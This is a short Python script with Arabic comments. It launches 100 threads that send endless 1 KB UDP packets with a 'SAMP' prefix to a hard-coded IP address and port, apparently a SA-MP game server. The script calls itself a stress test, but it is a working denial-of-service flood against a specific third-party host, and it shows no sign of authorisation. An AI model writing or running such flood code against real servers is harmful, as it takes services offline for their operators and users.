import socket
import threading
import sys

# معلومات الهدف
TARGET_IP = "94.23.168.153"  # IP السيرفر
TARGET_PORT = 2343        # المنفذ
THREADS_COUNT = 100       # عدد الخيوط

def stress_worker():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'SAMP' + b'\xFF' * 1024
    
    print("بدء تشغيل خيط الضغط...")
    while True:
        try:
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
        except Exception:
            pass

def main():
    print(f"=== بدء اختبار الضغط الشامل على {TARGET_IP}:{TARGET_PORT} باستخدام {THREADS_COUNT} خيط ===")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=stress_worker)
        t.daemon = True
        threads.append(t)
        t.start()
        
    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\nتم إيقاف الاختبار.")
        sys.exit(0)

if __name__ == "__main__":
    main()
